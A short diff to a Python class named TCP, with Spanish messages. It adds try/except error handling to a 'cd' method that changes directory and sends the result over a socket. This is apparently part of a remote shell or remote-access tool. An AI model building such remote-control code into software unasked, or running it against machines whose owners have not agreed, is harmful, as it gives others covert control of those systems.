@@ -332,8 +332,11 @@ class TCP:
     def cd(self, directorio):
         directorio = directorio.replace('~', self.__home) if directorio[0] == '~' else directorio
         if os.path.isdir(directorio):
-            os.chdir(directorio)
-            self.__sock.send(os.getcwd().encode())
+            try:
+                os.chdir(directorio)
+                self.__sock.send(os.getcwd().encode())
+            except Exception as e:
+                self.__sock.send(f"[-] {str(e)}".encode())
 
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
